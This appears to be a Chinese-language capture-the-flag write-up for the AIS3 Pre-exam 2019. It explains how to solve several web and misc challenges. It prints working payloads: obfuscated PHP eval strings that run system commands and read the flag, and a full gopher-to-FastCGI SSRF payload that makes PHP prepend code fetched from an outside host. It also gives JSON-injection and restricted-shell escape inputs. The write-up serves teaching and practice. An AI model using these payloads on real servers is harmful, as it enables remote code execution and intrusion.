# AIS3 Pre-exam 2019

佛系出題，每題都不擋非預期，每題都有多種簡單解法

## Web

### Simple Window

- 訪問`/`時會安裝 Service Worker
- 然後把`/flag` cache成別的頁面
- 把Service Worker取消或是關掉js就可
- 或是在第一次安裝時，它其實會去fetch `/flag`內容，你只要這時候抓這個response就行

### 3v4l

- 這題會把`$_GET["#"]`丟進`eval`跑
    - 瀏覽器送記得urlencode一下
    - `#` => `%23`
- 限制長度不能超過 18

- 解法一 (預期解)
    - PHP的`NOT`運算
    - `~%8C%86%8C%8B%9A%92` = `system`
    - `~%93%8C%DF%D0` = `ls /`
    - 組合起來: `(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);`
        - 就等於`system("ls /");`
        - 這邊可以得到flag name: `here_is_your_flag`
    - 最後去讀 flag:
        - `(~%9A%87%9A%9C)(~%9C%9E%8B%DF%D0%97%D5);`
        - `exec("cat /h*");`

- 解法二
    - 忘記擋 ``` `` ```
    - 直接``` `/***/*** /*`;  ```
    - 相當於``` `/bin/cat /*`; ```

- 解法三
    - ``` `\\143\\141\\164%20/*`; ```
    - 等同``` `cat /*`; ```

- 解法四
    - 來自 @cyku 大佬 
    - ``` `{${~%A0%B8%BA%AB}[0]}`; ```
    - `~%A0%B8%BA%AB` =  `_GET`
    - 把`$_GET[0]`拿去執行
    - 完整getshell

### BabySSRF

- 這題很單純把輸入的URL拿去curl跑
- 然後擋掉`file`, `flag`, `index.php`, metadata等關鍵字
    - `gopher://`沒擋
    - 可以任意 SSRF 構造 TCP packet
- 從`/robots.txt`可以找到`info.php`
    - 單純 `phpinfo`
    - 這邊就暗示後端是用 PHP-FPM 跑的

- 所以目標很明確，就是構造 FastCGI Protocol 去 RCE
    - 但限制長度只能 `236 Bytes`

- 構造 FastCGI Protocol 很容易，網路上隨便找都有 Payload generator
    - 但長度一般都很長，必須想辦法壓下來

- 壓 Payload 長度
    - `127.0.0.1` 可以換成 `0`
    - urlencode處理好 (只有 NULL Byte 和換行需要Double encode)
    - 大部分 Params 都能拔掉
        - 重要的只有`REQUEST_METHOD`和`PHP_VALUE`
        - 如果要在單個Request就執行`prepend_file`的話，要加`SCRIPT_FILENAME`
        - 多個Request的話，可以拔掉`SCRIPT_FILENAME`，先把設定寫進去
            - 譴責這種解法
            - 會把全部 fpm process 設定寫掉，影響別人解題
    - 買個短一點的 domain (X
        - 看看某海狗長度5的domain (貧窮限制了我的想像力)
    - 剩下就慢慢看 FastCGI 結構

- 範例 Payload:
    - `gopher://0:9000/_%01%01%2500%01%2500%08%2500%2500%2500%01%2500%2500%2500%2500%2500%2500%01%04%2500%01%2500%7F%2500%2500%0E%03REQUEST_METHODGET%0F%16SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Finfo.php%09%3APHP_VALUEallow_url_include%3DOn%250Aauto_prepend_file%3Dhttp%3A%2F%2Fkaibro.tw%01%04%2500%01%2500%2500%2500%2500%01%05%2500%01%2500%2500%2500%2500`


## Misc

### Are you admin ?

- 解法一 (預期解)
    - Ruby json 可以用註解
    - name: `","is_admin":"yes",/*`
    - age: `*/"@":"@`
- 解法二
    - 用`{}`去包`is_admin`
    - name: `","is_admin":"yes","x":{"":"`
    - age: `"},"":"`

### Pysh

- 解法一 (預期解)
    - `read`預設結果會存放到`$REPLY`
    - 所以`read;$REPLY`就能RCE
    - 也能`read a;$a`
- 解法二
    - `$SHELL`
    - 最多人用
- 解法三
    - `$BASH`
- 解法四
    - ``` a=`pr -T`;$a ```


----

p.s. 如果有人有其他解法歡迎發PR給我 <3